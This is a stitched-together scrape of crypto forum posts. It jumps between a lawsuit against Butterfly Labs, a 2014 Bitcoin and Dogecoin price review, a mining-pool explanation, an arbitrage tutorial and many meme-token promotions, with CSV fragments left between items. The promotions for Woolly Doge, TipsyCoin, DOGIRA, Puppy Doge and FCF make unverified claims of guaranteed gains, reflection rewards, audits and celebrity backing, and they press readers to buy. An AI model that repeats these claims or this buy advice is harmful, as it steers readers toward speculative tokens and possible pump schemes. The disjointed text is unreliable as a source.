BFL has now failed to respond to their loss of the suit and we are looking for ways to collect via lien, direct bank account deduction, etc. In addition we will be shortly expanding a second lawsuit based upon the proof of fraud whereby our bitcoins will be returned to us via a court procedure known as 'recession' [where the court orders that you are returned to the same position today that existed before the fraud occurred] and will seek to secure our bitcoins by way of a replevin order.

These processes are time and money consuming, but as BFL continues to ignore the court orders, their fines and fees are increasing from the date of our original judgment.

The chief obstacle for execution of a recession and replevin order is the notion that bitcoins [even though digital] are a type of property that can be 'seized' or returned, by an action provisioned under instructions given to a sheriff acting on orders from the court.

Of course, we crypto-geeks know that this can be easily accomplished, but BTCs are a new ""unknown"" to the US jurisprudential system, and our attorney has to guide them through the process and allow them to conclude that ""this can be done"".

If anyone is interested in filing suit against BFL remotely, I have an EXCELLENT attorney-- and since he has already won the first suit, it is a foregone conclusion he can win yours.

Now the caveat: BFL is very skilled at moving its money and its accounts around the various banks in Leawood Kansas. Our investigator has determined that they had accounts in certain banks which are now closed, but we suspect that they are no longer using the registered corp-name BF Labs Inc as the corporate name on the account they use to pay their local employees-- and they DO have to pay their employees somehow.

Speculation is that they have moved to using ADP or another third party payroll system and have masked their accounts.

We are pursuing a subpoena to force a court appearance by Sect/Treasurer Jody Drake to disclose the location of assets.

Anyone wishing information on the progress of the suit and information regarding process and procedures can contact me at info at coinpositive dot com.

Its truly great what those guys are doing....  
Bitcoin is truly great. And we should show the world that we mean business. We should start a crowdfunded BTC philanthropy association and start raising a multi crypto-fund for projects that are for the betterment of all.  
I propose our first project: to build a stretch of Solar Roadways.
We can set up an open.crowdtilt (or lighthouse when its ready) campaign, and raise enough funds to build a road (or whatever (solar recreation area?)) Crowd funded by our community. Not only will this be a great way to show the world how serious we are with taking the change we want into our own hands, but solar roads could, one day, produce all energy needed for mining...

The program extracts qtbitcoin trader client and some suspicious executables (bridgemigplugin.exe, vbc.exe).

DOGE,Bitcoin,The ALTCY Bitcoin/Doge Coin week in review March 8th 2014,"This is the second ALTCY Bitcoin/Doge Coin week in review, I hope you guys find it useful! :)

https://altcy.com/dogecoin-week-in-review-march-8th-2014/

The past week has seen significant shifts in the Bitcoin and Doge Coin markets. On March 1 the price of Bitcoin was near $560, and had been relatively stable since February 26. A significant rally in the price of Bitcoin versus the USD occurred on March 3, with the value of Bitcoin going from $560 to $710, corresponding to a $150/27% rise! Bitcoin quickly dropped from this peak value and settled into the $680-$690 range on March 4. The price of Bitcoin was mostly steady after that, with a slow decrease in value to $660 on March 5-6. On March 7 the market took a turn for the worse, with the price of Bitcoin declining all the way to $613, a 7% loss in a day. Since then Bitcoin has been fluctuating between $615 and $640. The market hasn’t been steady at all, but no overall up or down trend occurred on March 7-8 after the initial sell-off. Overall Bitcoin has had a good week, rising $65/12%.

Doge coin has had a much worse week than Bitcoin, continuing a trend which started February 12 when Doge coin’s value relative to Bitcoin peaked at 296 satoshis. Since then the BTC/DOGE ratio has almost continually decreased. On March 1 Doge was worth 190 satoshis, after peaking near 215 satoshis on February 27, which was the day the market rallied after the Mt. Gox bankruptcy sell-off. Doge declined to near 155 satoshis on March 4, and was as low as 145 satoshis briefly that day. This corresponds to a drop of 24% in Doge’s price relative to Bitcoin. There was a brief and intense rally on March 5, with Doge jumping from 155 to 180 satoshis, a 16% increase in value relative to Bitcoin. This rally quickly dissipated, and Doge was near 155 satoshis again by March 6. Doge then began its steady decline once again, and is near 145 satoshis as of March 8. Thus Doge has dropped 24% in value relative to Bitcoin this week, another tremendous hit to Doge coin’s power as a crypto currency. Since February 12 Doge coin has lost 51% of its value relative to Bitcoin, meaning if you held Bitcoin instead of Doge you’d have double your money.

The value of Doge in USD was $0.00105/Doge on March 1, and despite the $150 Bitcoin rally Doge only increased to $0.0011/Doge on March 4, since Doge’s value relative to Bitcoin was declining so quickly as Bitcoin’s USD value increased. As Bitcoin’s price leveled off Doge lost a lot of value relative to the USD, since Doge’s value relative to Bitcoin continued to decline. As of March 8 the USD value of Doge is near $0.00091/Doge, and therefore Doge’s USD value has declined 13% this week. Since February 12 Doge has declined from a peak $0.002/Doge, corresponding to a 55% loss in value relative to the USD. Overall, market trends have been unfavorable for Doge for nearly a month straight now, with very little in the way of rallies. Selling pressure has simply dominated buying pressure. It’s possible this is partially due to Bitcoin regaining some stability and trust since Mt. Gox is no longer around. Now investors are more willing to put their money into Bitcoin. This makes sense especially when you consider that Doge reached its peak satoshi value during the massive Bitcoin sell-off when Mt. Gox initially halted withdrawals, investors saw Doge as a haven during the Bitcoin storm. Now the storm is over and investors are fleeing back to Bitcoin. The constant downward trend of Doge relative to Bitcoin is re-enforcing the movement of money from Doge to Bitcoin, it makes little sense to keep all your money in Doge considering the current market trends.

That being said, I’d be surprised if Doge continued downwards for much longer. There still seems to be strong buying pressure and interest among the community. Millions of Doge are sold daily well above market value to many eager buyers, as high as $0.00105/Doge to $0.00125/Doge in most marketplaces, even as high as $0.0015/Doge on ebay. This indicates that Doge may be significantly undervalued. Once the real Doge rally arrives, the price will likely skyrocket, much like it did around February 11. Thus, I’d say now is a good time to buy Doge and hold it. There may be another 10-20 satoshis of loss before the rally occurs, but that will be small compared to the rally itself. Of course, this is just speculation based on my understanding of the market, and anything could happen. I think Bitcoin is due for another rally as well, and I’d be surprised if it doesn’t hit $800 in the next couple months. The Mt. Gox situation is now behind us, and therefore Bitcoin can grow naturally again.

There’s been little if any mention of Doge in the news this week. A flurry of Bitcoin news stories continue to roll in though. Satoshi, the creator of Bitcoin, has been photographed for the first time. The man photographed refused to claim association with Bitcoin, but most agree it was Satoshi himself. Meanwhile, the Bitcoin exchange Flexcoin was hacked and lost 440,000 Euros worth of Bitcoin, forcing them to close. This story isn’t much different than what happened to Mt. Gox, and stories like these continue to bring into question how safe exchanges are, and ruin investor trust.

A big thank you to everyone who reached out to us. I spent a good chunk of today talking with programmers about APIs and wallets so we can decide exactly what we need to do with our site to add Bitcoin as a payment option.

- There were no decentralized asset exchanges for stocks (counterparty, colored coins)

- There was no decentralized market for goods and services (OpenBazaar)

- There was no Dark Wallet for bitcoin privacy

- Three of the largest crypto stock exchanges had just shut down nearly simultaneously, sending crypto-equities into disarray (BTC-GLOBAL, Litecoin Global, Bitfunder). Havelock Investments ""relocated"" to Panama

- Apple had zero policy on virtual currencies and would ban bitcoin apps

- Paypal would ban virtual currency transactions and hadn't made any favorable stance toward them whatsoever

- Mt. Gox withdrawals were delayed months on end, even as people continued to send fiat and bitcoin to accounts there

- Prospective miners were still ordering from Butterfly Labs

- There was no tax guidance for bitcoin or virtual currencies, in the United States, as a large rally in bitcoin price history was beginning

- Dogecoin did not exist, and by proxy, philanthropic crowdfunding of sports events or .. anything really.. had never happened in cryptocurrency. There literally was no onramp for beginners and there was nothing to really laugh at either

Sports are a great way to spread the word about something and have been used successfully in many types of marketing.  UFC is a great fit because it's a fast growing sport with athletes who are more accessible than the NFL or NBA for example.

Please don't send any money anywhere yet -  if and when we agree on something with Joe, we will do a video with the keys etc. like Andreas did for the Dorian donation.   Please do NOT trust anything unless it is from Joe directly or from me and also verified by Joe.  Any future announcement on this will come from this Reddit account AND will contain a public address with link to video verification or will come from Joe in a manner that leaves no question as to authenticity such as video.


EDIT: Thanks for the feedback --  if you say ""I'm in"" if there is a way to quantify that a bit more...whether you mean one millibit, 30 Bitcoin etc. it would be helpful to gauge",459,2014-05-06 10:21:41,389

DOGE,Bitcoin,I own a large mining operation. I'll explain why I mine at ghash.io,"[I hope this is intelligible... I'm sleep deprived and submitting this from my phone]    
    
EDIT: *In this case, luck is a technical term. If a block is found earlier than statistically expected then it's good ""luck"", later is bad luck. Larger pools find more blocks so ""luck"" averages closer to neutral, which is desirable,* **while difficulty is increasing.**       
    
Mining is expensive and Miners need to maximize profit in order to pay the bills and return-on-investment, ROI.   
""Why don't you just mine with slush/p2pool/solo??""    
Because of variance in the time between blocks, variance in luck. The difficulty is increasing so dramatically that avoiding variance is critical to insure profit. In a perfect world, difficulty would be static and mining solo would statistically be as profitable as mining with a pool, over a long enough period of time. As things are, it's significantly less profitable to mine at a small pool, and forget about ROI if you mine solo. Think about it: a small pool might not find a single block between difficulty adjustments! Even a medium sized pool will sometimes find fewer-than-expected blocks during a difficulty window, which, technically, sucks.
   
While the difficulty is increasing mining farms will gravitate to the pool with the largest hashrate. It doesn't help that btcguild is charging fees and eligius is run by a religious fanatic. Also, ghash merge mines ixc + dvc which is not insignificant for a large farm.    
Imo p2pool needs to be as easy to use as any other pool. No Python, nothing special, cevidad and lukejr need to make cgminer/bfgminer do everything behind the scenes. This is the only solution to large pools.    
STEP 1- CHANGE THE MINING SOFTWARE TO MAKE P2POOL AS EASY AS ANY OTHER POOL.    
STEP 2- PUBLICLY ANNOUNCE A DATE OF RELEASE TO ALLOW POOL OPERATORS TO PREPARE.  WE ALL NEED TO SWITCH  SIMULTANEOUSLY IN ORDER TO MAINTAIN LOW VARIANCE.      
(BONUS POINTS IF MERGED MINING IS BUILT IN.)    
      
Tl;dr for all intents and purposes, there is no competition for ghash.io",329,2014-06-13 16:24:42,564

Woolly Doge is a type of Shiba Inu that is randomly born with a recessive trait that makes their hair very long, very fluffy and very cute! Woolly doges are born randomly and very rarely, and therefore cannot be created like regular Doges. It’s up to pure luck for a Momma and Daddy Doge to have a Woolly Doge in their litter. Celebrities spend 5x the price for these eccentric fur balls because of how rare and cute they are.

&#x200B;

Woolly Doge is the fluffiest doge of the Doge family. He was the only doge in the family born with extra long fur, which makes him very rare and extremely cute. The rest of the doge family makes fun of Woolly, but secretly they envy him. Maybe it’s just me, but I can’t help but to collapse on the floor and start crying when I look at Woolly Doge because he’s so darn cute!

&#x200B;

Woolly spent his first days getting bullied by his brothers and sisters, especially Mini doge. They would bite him, and drag him around by his long fur coat, but they couldn’t hurt him because his fur was so thick! This has made Woolly Doge by far the most resilient of all the doges. One day, when Woolly was playing in the front of the Doge family’s mansion home, his jealous sister Mini Doge pushed him into the street, right in front of a speeding car! Woolly rolled into the cars path… ‘Skreeeeeeetch’ went the car! What happened next, made the entire Doge family drop their jaws. To their shock and surprise, the speeding car bounced off of Woolly Doge, doing a front flip over itself and landed perfectly on it’s wheels and kept on driving. Fearing for Woolly’s life, all the Doges ran over to see if Woolly was alright. Woolly Doge was LAUGHING OUT LOUD. Woolly Doge’s extra fuzzy fur acted as a shock absorber and didn’t feel a thing!

DOGE,CryptoMoonShots,WoollyDoge presale in 2 days 🚀 | Earn 8% DogeCoin just by holding! | Auto distribution and Dividend payouts 💰,"🗓 Presale begins on DxSale July 29th

🔗 https://dxsale.app/app/v2\_9/defipresale?saleID=1745&chain=BSC

I have incredibly sad story to tell you. Today, as I was walking my kids home from school, we saw two of our neighbors' adorable Shiba Inu puppies playing near our house in their front yard. One of them is really small, and the other was super fluffy and cute and really friendly! Honestly I had never seen a Shiba Inu so fluffy before! Anyways, after my kids had their fun, we were about to head inside, when out of nowhere some jerk driving a slime green Lamborghini with peanut butter seats came sliding around the corner in a cloud of smoke. The driver floored it and came barreling toward us, and yelled something like ""pop smoke b\*\*\*h!"" Sadly, the small Shiba pushed the fluffy one into the street right in front of the speeding jerk in the Lambo. The car hit the poor fluffy Shiba dead on, flipping him up into the air. 

Now, I normally wouldn't tell a sad story like this and post it on Crypto Moon Shots, but the end of the story is quite extraordinary.

Flipping through the air, the fluffy Shiba Inu fell back into the cloud of tire smoke. We rushed over, along with other doges from the neighborhood, to see if he was alright. When the smoke cleared, he was standing on his feet and wagging his tail! We couldn't believe it! He had a huge smile on his face as if he was laughing!

We started talking to the other doges and two of them were his parents. They explained to us that he has a recessive genetic trait that makes him have very long and fluffy hair that actually protects him from getting hurt. They told me the name is Woolly Shiba's. My kids starting pleading with, ""I want a Woolly Doge, I want a Woolly Doge!"" I looked up online how expensive they are, and told my kids maybe for Christmas. 

Next time I see that driver I'm going to really give him a piece of my mind….

DOGE,CryptoMoonShots,$NEIRO - Dogecoins new sister ,"
For those who are new to cryptocurrency or unfamiliar with recent developments, the owners of the original Dogecoin dog have adopted a new dog named NEIRO.

This narrative alone has created a bullish sentiment around the new dog-themed coin. Remarkably, this meme coin community has shown impressive strength and engagement, even though it is only 10 days old.

Here is a brief overview of the coin's rapid growth and its community's enthusiasm:
On the first day the new dog was introduced, two copycat coins emerged immediately after the original was launched, causing market confusion about the authentic coin. These copycat coins were quickly concentrated in a few wallets, holding 70% of the total supply. This tactic was not widely recognized until a day or two later, yet many influencers and key opinion leaders (KOLs) promoted it as a bullish move.

In contrast, the original coin was not pre-bundled. Despite an initial sell-off by the developer within the first 24 hours, the resilient community managed to overcome this setback and took control of the project. Now, the community has full ownership and direction of the coin.

As of this writing, we have reached a market cap of $11.8 million and have 11.5k holders, with significant potential for further growth into the billions.

We invite you to review our progress by checking out our chart or joining our active voice chat on Telegram, where we welcome any questions. Our community is highly active and open to new members.

Neither Dogecoin ($DOGE) nor Bitcoin ($BTC) were pre-bundled, and our original $NEIRO follows the same principle. This coin upholds the true values of cryptocurrency.

We also have communities supporting multiple languages, emphasizing the global nature of this coin, which is poised for significant growth.

(P.S. Our contract address ends with 'bropump' – how is that not bullish?)

We hope to see you soon! Please find more information on our Linktree below.

DOGE,CryptoMoonShots,🐕Woolly Doge Coin - A Story Coin 🐕 Presale Live ! 75 Softcap / 150 Hardcap | 8% rewards in paid in Dogecoin!,"$Woolly is a fantastic new coin for dogecoin fans, as you get dogecoin paid back every 30 minutes!

Woolly's Story Update Part 1/5 - ""Fluffanova"" 💥

&#x200B;

Woolly has enough fur to survive in outer space. Woolly Doge's fur keeps enough oxygen and warmth to survive even the most inhospitable environment. This made Woolly the prime candidate for the SpaceX funded mission ""Fluffanova"", an interstellar exploration force, bound for exploring the a star about to go supernova. A supernova is a star that is too big and collapses on itself due to it's extreme gravity. It's very similar to how Woolly Shiba's grow too much fur, which can also cause them to self-implode.

&#x200B;

On Woolly's first day at SpaceX, he met Elon Musk. A security team brought Woolly into a bunker where Elon was in the middle of directing a team of executives, chief scientists, military generals, and top dogecoin wallet holders on how to support Earth's most important mission it had ever faced. 

&#x200B;

Woolly tried to enter the meeting room quietly. ""I want you all to meet Woolly Doge, he's going to be commanding our Fluffanova mission"", said Elon, staring directly into Woolly's eyes, which he rarely does. The room became quiet. One investor spoke up, ""What is this? Some kind of joke?"" Elon then turned his gaze to his security, ""Delete him."" he said calmly . The security guards picked up carried the investor out of the room by his hands and feed like a sack of potatoes, as he apologized and begged for Elon's forgiveness. 

&#x200B;

Elon picked up his phone and posted a quick tweet about Woolly Doge's 8% dogecoin rewards. 

&#x200B;

The lights dimmed and a holoprojector come out of the ceiling. Elon snapped his fingers and a hologram of a star system appeared in the middle of the room. ""This,"" Elon said, ""is Betelgeuse, the nearest star system to Earth that will go supernova, and it will happen within the next 100 years. Unfortunately, the blast radius will completely destroy our solar system, including our Sun."" He continued, ""And the only possible way to stop this from happening is by sending Woolly Doge to prevent the star from exploding. ""How will that work?"", asked one of the Generals.  ""Simple, by not brushing Woolly Doge for a long time, he will naturally implode in on himself creating a black hole, and by sending brave Woolly close enough to the star, and by not brushing him too much, he will implode at the same time, effectively absorbing the explosion from Betelgeuse, saving our planet and species."" Woolly gulped.👀

DOGE,CryptoMoonShots,"🤷‍ Move Along Dogecoin and Decentraland, The Media's Hyping Up TipsyCoin!!! 💰","Remember the Netflix movie Ready Player One? I think I found the kinder version of it. 🐧🐧 TipsyVerse is a game created by “penguins” and it promotes social interaction where players can make friends and even get married! 💏🎎

THE HYPE IS REAL and everyone seems to be raving about it. I’ve already seen recommendations from celebrities like Paula Abdul and Kevin Quinn, as well as published articles in major news sites like Forbes (Yes, Forbes), Tech Times, and Investing.com.

The currency of the TipsyVerse game is called $tipsy (stands for TipsyCoin). The currency is launching in 1st quarter of 2022 (around January to March) with no presales - 🚫📉 I always like a fair launch as you won’t see huge dumps at the point it hits the DEX. I’ve joined the telegram and discord channels and am keeping it on my watch list. Good to know that the team is based and looks really committed. While media sites are bashing DogeCoin because of the lack of utility, $tipsy seems to go a longer way. 📈 📈 📈

**1. TipsyCoin automatically rewards its holders!** 🤑🤑🤑

On its own, the coin provides utility that’s easy to use because holders just need to have $tipsy and their balance will grow automatically from tax revenue that TipsyCoin collects. The community focused coin is designed to be deflationary and its value would keep increasing. 💸 Basically $tipsy has a fixed finite supply and no more of it is being minted.

Whoever sells their $tipsy will have to pay a 10% tax and this tax goes to other holders of $tipsy who earn rewards. 💰 Part of the tax proceeds also burns $tipsy and reduces the available supply in the market. And don’t worry, there is no tax when buying $tipsy because they want us to be part of their family 💛. I applaud the commitment as they are putting in measures to protect their investors and ensuring as much as possible that it only goes up. 🚀

**2.** 💯💯 **It’s finally time for top-notch graphics**

But moving onto the meat of it, the TipsyCoin will have immense value when you look at the planned development, the TipsyVerse. Similar metaverse projects in the market like Decentraland and Sandbox are currently being criticized because of their graphics. 🙈🙈

How are such crazy valuations, billions of dollars, justified for games that look like a slightly tuned version of the 90’s pac-man? 😹 TipsyVerse is taking a no-nonsense approach – they are hiring sophisticated 3D artists to ensure that their game will rock with top notch graphics as a dedicated installable game. On a fundamental level, it’s not surprising that it will be better than games like Decentraland that load on browsers, which inherently gives it lots of limitations with performance, the most obvious being that it’s laggier than games that are downloaded and installed directly on your phone / PC.

While we are still waiting for more TipsyVerse graphics to unfold, the gallery artwork and quality of the graphics on TipsyCoin’s website are an indicative sign of their capabilities and I’m 💯💯💯 super confident that they have the resources to destroy the competition.

The budget is well set aside for developments, and TipsyCoin has assured us that its smart contracts will be audited before launch and previews of the game will be available, all before Q1 of 2022, so I’ll be monitoring to hear the news. It’s good to know that they’ve already done KYC with a reputable firm and Certik (the company that audited Binance and Crypto.com) will be vouching for TipsyCoin’s credibility.

**3. TipsyVerse is going to be more than a game, it will be a lifestyle** 🍹🍷🍾🤘🐧

What I really like is that it sounds like TipsyVerse will not be a crazy over-complicated game but will be well-balanced with a variety of activities – imo that’s the formula for mass adoption as a complicated game will not scale to the masses.

It’s also focused on social interaction, and I can’t wait to party like a true baller in their TipsyVerse M.A.D club (as they call it)… buying magnum sized luminous Dom Perignon bottles to really show up – I mean you are not going to consume virtual alcohol, but it makes a real sick NFT if you ask me. With the ability to purchase outfits from luxury brands for our characters 🎩👛💍👞, along with rocket ships for cars 🚀, and pet flying pigs 🐖 (yeah, they have this instead of birds), and houses / land that’s customizable with furniture from different eras. NFTs are ever-growing in popularity and TipsyCoin is pressing the right buttons.

**4. Play to earn, and the chance to hang out with the stars** 😎😲

Whether the crypto market is in a bull or bear, TipsyVerse is going to have real utility as it will be highly engaging and still provide play-to-earn opportunities through their countless games. 💲💲 The play to earn is going to be competitive though, as I read that you must attain a high position on the leaderboard rankings before you are eligible to partake in competitions that pay $tipsy.

Examples of games are skiing ⛷, water-rafting 🚣, go-karting 🏎, golf 🏌, and skydiving . I’ve never skydived IRL because of my fear of heights, but I don’t see why I wouldn’t in TipsyVerse… There’s also casinos where you can try a game of poker and go all in with your precious earnings. 💰😎💰 If this game goes hype, I’m just thinking that there might even be an opportunity to play with Daniel Negreanu. I know TipsyCoin’s dev team is well-off, and they are working with celebs and have donated quite a bit to various charities even before launching. Media sites have also speculated that artists like Akon and Justin Bieber may be performing in TipsyVerse concerts 👯. I’m impressed that it’s well thought out and addresses our social needs to interact with our friends and with the added plus point of possibly even hanging with celebrities in game.

The team is planning to integrate TipsyVerse with VR headsets so gamers can immerse themselves into the virtual world. They also have plans to R&D bodysuits, and it seems like they are really trying to recreate the real world just so we can feel the poker chips in our hands for a truly surreal experience. 🚀🚀🚀

DOGE,CryptoMoonShots,"Cryptocurrency arbitrage: Dogecoin and XRP - a quick way to make money
","Cryptocurrency arbitrage is not just about buying and selling. This is a real quest with timing, speed and subtle strategy, especially when it comes to coins like Dogecoin (DOGE) and XRP. Let's figure out how to profit from the price difference between exchanges using these coins. In the video you can see more trading information about arbitrage trading and see the exact trading strategy with a profit of 15/17 percent   [https://www.youtube.com/watch?v=IlctLTnNhRM](https://www.youtube.com/watch?v=IlctLTnNhRM)

What is arbitration?  
Arbitrage is the purchase of an asset on one exchange, where its price is lower, and an immediate sale on another exchange, where the price is higher. The difference between these prices is your profit. The key is to act quickly before the market corrects this ""anomaly"".  
  
Why Dogecoin and XRP?  
Dogecoin — often fluctuates due to the hype in social networks, which causes significant price spikes on different exchanges.  
XRP is a popular cryptocurrency with high liquidity, which makes it ideal for arbitrage.  
Step-by-step arbitration process:  
Step 1: Find the price difference  
  
Register on several exchanges, for example, Binance, Kraken, KuCoin.  
Use price aggregators like CoinMarketCap or CryptoCompare to track current Doge and XRP quotes on different platforms.  
Comment: If you see that DOGE costs $0.064 on Kraken and $0.066 on Binance, then this is the perfect opportunity for arbitrage!  
  
Step 2: Buying Coins  
  
Once you have found a profitable discrepancy, buy DOGE or XRP on an exchange with a lower price.  
For example, you buy 1000 DOGE on Kraken for $0.064, which will cost $64 in total.  
Comment: Remember that cryptocurrency prices can change in seconds, so be prepared to act quickly.  
  
Step 3: Transfer and Sale  
  
Transfer your Dogecoins from the first exchange (Kraken) to the second (Binance) and sell them there at a price of $0.066. Now your income will be $66.  
Comment: Take into account the transfer and trading fees. For example, if the commissions are $1 per transaction, then the net profit will be $1.  
  
Step 4: Calculating the profit  
  
The difference in price — $2 ($66 - $64), minus $1 for commissions = net profit of $1.  
Useful tools for arbitration:  
Crypto Price Trackers: Help you track prices on multiple exchanges at the same time.  
Arbitrage Bots: Can be configured to automatically execute arbitrage trades.  
Risks:  
Delays in transfers: cryptocurrencies may ""hang"" on the network, and the price on the second exchange may change.  
Commissions: always check the commissions of the exchanges so as not to be at a loss.  
Conclusion:  
Arbitrage with Dogecoin and XRP is an effective strategy for those who want to make quick money from market fluctuations. But for successful arbitrage, you will need speed, accuracy and market knowledge.",274,2024-09-08 11:03:52,8

DOGE,CryptoMoonShots,"$DOGIRA is up 4x from the dip, and 2x from the average this week. We're a utility/nft-backed token, lead by an OG Dogecoin Dev - with a Satoshi AMA today!","Hey all, usual warning applies as with all my last posts - I'm the OG Dogecoin Dev listed above. Everything I say here will be extremely biased, as I am directly involved with the coin, and obviously would directly benefit from it's success. Never take financial advice from anyone on reddit, especially from someone involved on the project they're talking about. Always DYOR, and Ape in safely.

---

It's been a big week for $DOGIRA - we crabbed down to around 2c recently, while myself and the team did some major restructuring to ensure the coin's long-term viability, roadmapping, and a management overhaul to ensure we have our sights firmly set on immediate growth, and safely wading through the inevitable ""memecoin"" bubble burst. Following this, we shot back up to our 4c ""stablecoin"" levels, before rocketing past that on to our current value of 8c/token today!

Now, on that - Dogira has a meme on the front of the coin, but that's where the memes stop. Behind Dogira, we've a professional team focusing on ensuring that the coin has real utility, and real use cases. Believe it or not, this is exactly what we did in 2013/2014 when it came to Doge - we focused hard on creating the utility, and empowering the developers that made Dogecoin legitimately fun to hold and spend. Nobody wants to just sit around accumulating a currency which has no use case, unless they're fans of tulip mania.

So, here's the scoop on how Dogira is doing at the moment, and what we've got planned for the immediate future;

----

**Dogira** - The Low-down

* **Microcap Token; currently < $7mil in Market Cap**

* **Currently in the middle of a $100k Marketing Campaign!**

* **Officially Partnered with Feed Every Gorilla, with 4 million Dogira tokens being allocated to FEG's staking pool**

Our next major goals following the end of the current marketing campaign will be to roll out onto the V2 of our token, which is currently in development. This version of our smartcontract is being built specifically to aid us with our goals in developing Native Blockchain Gaming solutions, alongside enhancing our NFT/Token ecosystem, which has already added so much value to Dogira in it's current, far more basic state.

We'll be doing an AMA with the Satoshi Club as mentioned above, in just under an hour and a half away from the time of this post. Satoshi Club have over 50,000 members, and an extremely engaged userbase - so, if you want to see how we do on the spot, or ask any questions yourself, please consider jumping on! Instructions for joining and taking part can be found on our Telegram Community.

We're ecstatic to see the current momentum behind Dogira, and the team are greatly looking forward to running with that momentum and ensuring that our efforts continue to pour into creating a coin that has the use-cases, and the tangible value to take us far into the future. If you're on the fence, consider jumping in on our Telegram group to get a feel for the community - or of course, jump on to our AMA with Satoshi Club, and get a feel for how a third-party, massive community takes to the project!

We're living in an extremely exciting time for the Crypto community in general right now, and seem to be right on the cusp of where digital currencies are quickly moving to become something that's going to see real everyday use, by everyday people in the near future. I'm hugely proud to be part of the Dogira team we've got, and the community we've built around the coin - there's very little more exciting than getting to work with an excellent team to push the boundaries of innovation towards what we can achieve together in this space.

DOGE,CryptoMoonShots,📝 Whitelist Competition ongoing for Puppy Doge 🐕 One day left to get in the BIGGEST Dogecoin presale of the summer 🌭,"**Nearing 10,000 members on Telegram,** the hype for Puppy Doge is going absolutely nuts with people breathing about, wondering if this recent pump in the market, with **BTC breaking over $40k for the first time since early June**, and looking for $41k, the highest its been since the big crash in May.

If a new bull run breaks out, **Puppy Doge will be leading the new pack** and hugely deliver on its promise to bring financial maturity to your portfolio.

Even if it doesn’t, we only need to look at other big dogecoin launches from Baby Doge to Mini Doge, and the recent launches of Baby Cake and BabyDOT, to see that there is plenty of juice in the market and appetite for a reflections-based Dogecoin.

With **15% of every transaction being converted into BNB** which is distributed into the wallets of $PUPPY owners, this token is the meta in a nutshell which is why so many people are going around to spread the word wherever they can.

The **presale is coming soon** and with it the public listing after which Puppy Doge will be able to **show you exactly how much you’ve made off $PUPPY** and how many reflections you’ve received **with a fully functional dashboard.**

It really doesn’t get any easier raising a Dogecoin to be your faithful friend finding you financial freedom than it does with puppy Doge.

There’s still time to enter the **whitelist competition ending tomorrow night, 11:59pm UTC on 7/29**, and it’s a raffle so every entry can give you the opportunity to buy **2.5 BNB of $PUPPY at a price below PancakeSwap listing.**

Opportunities like that don’t come very often and when the **price of entry is nothing more than your time,** it’s certainly one worth grasping.

Will you have a piece of one of the **biggest Dogecoin launches in a rebounding market?** Only you can decide.

Buff Doge Coin is the Buff version of Dogecoin. Buff Doge Coin is extremely hyper deflationary where each burn will double in its quantity to the previous burn. The project has a serious mission of rescuing animal shelter and environment such as forest conservation. It is due to the Interconnection of Everything. When we destroy nature, it will also destroy human and animals as “We are One”. If we destroy one part, the other part will also get affected. We believe that the most important mission in this lifetime is to live in harmony with all sorts of life - human beings, animals and nature. Whatever you destroy outside yourself, you destroy within yourself. Thus, some of the developer’s profit will be donated to rescue animal shelter and environment.”

This weekend they're going to be donating $20,000 to Rocket Dog Rescue - a charity that Billy Markus has recommended to them and has said will promote the live stream!

Project Mission

**MoonPaw was designed to bridge the gap between content, community and crypto.**

\- **Content**: We are currently working towards creating products such as comics, NFTs and games that educate the general public on cryptocurrencies in an entertaining, easy-to-understand way.

\- **Community**: In the 2 weeks since we launched, we have already raised $50,000 for animal welfare and wildlife conservation efforts (which we achieve through a 2% tax on transactions when our token is traded).

\- **Crypto**: Our goal with this project is to bring the utilisation of cryptocurrency into the mainstream. We see a future where all of our entertainment products seamlessly integrate with the MoonPaw token e.g. you could get you exclusive access to certain content, discounts on merchandise, it could be used as an in-game currency when we release online games or it could even be used to vote on which charity we donate to that particular week!",959,2021-05-16 09:35:25,32

DOGE,CryptoMoonShots,"$FCF World's 1st RST token (Revenue sharing token) | Crypto Payment Gateway Is Live| 66% of the gateway revenue goes back to the community!|Web3 Poker club and licensed casino is LIVE | Dozens of deals in negotiation with PSP to use FCFPAY |All over the news with shiba inu, floki and dogecoin listed","**Currently pumping at 6M MC**

The $FCF team has won the Crypto Innovation of the year at the dubai crypto expo! FCF PAY is changing the way the world spend and earn cryptocurrency.

The team is in negotiation and signed NDA with dozens of Payment service providers and top tier exchange to partner with FCFPAY to allow merchants into easily accepting any crypto as currency!

The Team is doxxed, always delivers on their promises! This token is 1 year old and keeps on growing!

**Discover our Revenue Sharing Token Ecosystem! (RST)** A real world product(FCFpay) that keeps fueling our investor token $FCF!

33% of all the fees collected by FCFPAY are used for buy backs and burns! Another 33% Goes directly to the holders in BNB!

$FCFpay integrates with the 3 biggest e-commerce platforms – WooCommerce & Magento & Prestashop. But FCFpay doesn’t stop there… The flexible API allows it to be integrated into practically any existing payment system, even in physical retail stores! In fact, a large proportion of the first merchants to use it will be physical stores.

**Imagine paying directly with crypto!** You can nowshop online or in person, and spend your crypto gains without having to send them to the bank or use a “crypto credit card” that is actually just swapping your crypto for fiat. Crypto is about to fulfill its true purpose as the CASH of the internet!

Fcfpay allow you to buy flowers with BNB and order food with Cardano (or any other crypto)... just about any combination you can imagine, and all without requiring you to use a traditional offramp, such as a centralized exchange.

This will allow FCF to unite the $4 trillion-dollar online shopping industry with the cryptocurrency world. This unification positions FCF to lead the way towards mass adoption and secures the future of FCF as an essential crypto technology!

That’s why their motto is “EMPOWERING CRYPTO”!

**$FCF is listed on Pancakeswap, LBANK and hotbit. The next goal is a tier A Exchange!**

The payment gateway is used daily by several PSPS and is growing every week!

$FCF rewards holders with BNB dividends based on trading volume (5% of each transaction goes to the dividend pool and is distributed proportionally) AND from a portion of transaction fees once

FCFpay is launched. Yes, you will earn dividends on every payment gateway transaction! This safeguards your investment from bear markets by establishing a second source of dividend revenue! Imagine receiving a portion of the $4 trillion-dollar e-commerce industry simply by holding FCF!

FCF POKER ROOM and Licensed casino is live and you can play with your crypto now! 

**Buy and hold for 30Days and get a full tax refund!**  
**The Dev is always active and always OVERDELIVERS.**

**Dev is Doxxed, KYCd and a Certik audited!**

Since the incredible rise of the original **Dogecoin**

the market has been inundated with new sorts of Doge coins, many of which have little utility and no durability.

Do not be alarmed, Dogestribute has arrived to pay homage to the original Doge.

Dogestribute will provide you Doge only for holding it, but it will not be like any other redistribution currency. **Dogestribute will be Doge rewards on steroids.** 🔥

🔺 *By choosing a high percentage of rewards within their tokenomics, holders will be raking in Doge in the thousands, yes you heard that right thousands of $DOGE in rewards.*

*It’s time to stack that Doge up whilst Doge is sitting at 31 cents, for the day it will inevitably reach a dollare*

